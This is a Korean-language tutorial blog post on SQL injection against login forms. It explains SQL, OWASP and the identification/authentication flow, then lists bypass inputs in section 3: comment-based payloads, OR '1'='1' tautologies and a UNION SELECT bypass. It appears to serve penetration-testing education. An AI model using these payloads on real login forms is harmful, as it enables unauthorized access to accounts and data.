---
layout: post
title: "SQL Injection -01 로그인"
tags: [모의해킹, SQL Injection]
comments: true
---

SQL Injection의 개념과 공격 방식 로그인 편

---

## (1) SQL 개념

![image](https://github.com/what0302/what0302.github.io/assets/18510716/ddb55325-2bc2-4ab6-983b-dc0ea67abacb)

### 1-1 SQL이란?

SQL(Structed Query Language : 구조적 질의 언어)는 관계형 데이터베이스 시스템에서 자료를 관리 및 처리하기 위해 설계된 언어임.

### 1-2 SQL Injection이란?

악의적인 사용자가 응용 프로그램 보안 상의 허점을 의도적으로 이용해, 악의적인 SQL 쿼리문을 주입하고 실행되게 하여 데이터베이스가 비정상적인 동작을 하도로 조작하는 행위임.

주로 사용자가 입력한 데이터를 제대로 필터링, 이스케이핑하지 못했을 경우에 발생함. 이러한 Injection 공격은 OWASP에서도 1순위로 분류될 만큼 공격이 성공할 경우 막대한 피해를 입힐 수 있어 보안에 각별한 주의가 필요함.

* OWASP(Open Web Application Security Project : 오픈소스 웹 애플리케이션 보안 프로젝트)란, 주로 웹에 관한 정보노출, 악성파일 및 스크립트, 보안 취약점 등을 연구하는 개방형 커뮤니티이며, 10대 웹 애플리케이션 취약점(OWASP TOP 10)을 발표함.

## (2) 로그인 인증

SQL Injection 공격은 DB와 웹사이트가 연결된 모든 파라미터에서 공격이 가능함. 여기서는 우선 로그인 파라미터에서 공격이 어떤 식으로 진행되는지를 간략히 설명함.

### 2-1 로그인 인증 과정

사용자가 웹사이트에 로그인을 진행하게 되면, 두 가지 프로세스가 처리되는데 하나는 **식별**이고 다른 하나는 **인증**임.

식별은 사용자가 시스템에게 인증받은 자라는 것을 확인 요청하는 프로세스로, 많은 데이터 중에서 사용자를 특정할 수 있는 정보를 뜻함.
대표적인 식별 정보에는 ID가 있으며, 이는 중복될 수 없음.

인증은 시스템이 사용자가 본인임을 증명하는 프로세스로, 일반적으로 비밀번호를 통해 사용자에게 인증을 요구함.
대표적인 인증 정보에는 비밀번호가 있음.

### 2-2 식별과 인증 프로세스

로그인 시 진행되는 식별과 인증의 프로세스는 크게 두 가지로 분류할 수 있음.

### 2-2-1 식별&인증 동시 방식

식별&인증 동시 방식은 아이디와 비밀번호를 동시에 비교해서 로그인하는 과정임.
`select * from table where id='eric' and password='eric1234';`

### 2-2-2 식별&인증 분리 방식

식별&인증 분리 방식은 아이디가 존재하는지 먼저 확인하고 비밀번호를 비교해서 로그인하는 과정임.
`if(select * from table where id='eric'; == user_id){
  if(select * from table where password='eric1234'; ==user_pw)
  }`

## (3) 로그인 인증 우회

로그인 파라미터에 SQL 질의문을 삽입하여 로그인 인증을 우회하는 방법을 설명함.

### 3-1 식별&인증 동시 우회

### 3-1-1 주석 처리 우회

(1) `select * from table where id='eric'#' and password='1';`
입력값 : eric'#

(2) `select * from table where id='eric' or '1'='1' # and password ='1';`
입력값 : eric' or '1'='1' #

-> and 문을 주석처리하여 인증 과정을 우회함

### 3-1-2 or 구문 우회

(1) `select * from table where id='eric' or '1'='1' and password ='1';`
입력값 : eric' or '1'='1

-> SQL 문법에선 or 연산자보다 and 연산자가 우선 처리됨. 즉, 후자의 and 문이 처리되면 거짓으로 처리되나, 이후에 처리되는 or 문 때문에 아이디가 eric 이거나 뒤의 and 문 중 하나만 참이어도 결과가 출력됨. 그러므로 해당 SQL 쿼리가 실행되면 eric의 정보가 추출됨

(2) `select * from table where id='eric' or '1'='1' or '1'='1' and password='1';`
입력값 : eric' or '1'='1' or '1'='1

-> 위에선 eric에 대한 정보만 추출되었다면, 해당 SQL 쿼리는 모든 정보를 추출할 수 있음.

### 3-2 식별&인증 분리 우회

### 3-1-3 union 우회

(1) `select * from table where id='eric' union select '1','2','3','4' # and password='1';`
입력값 : eric' union select '1','2','3','4' #

-> SQL에서 union은 쿼리를 여러개 실행할 수 있게 만들어주는 문법임.













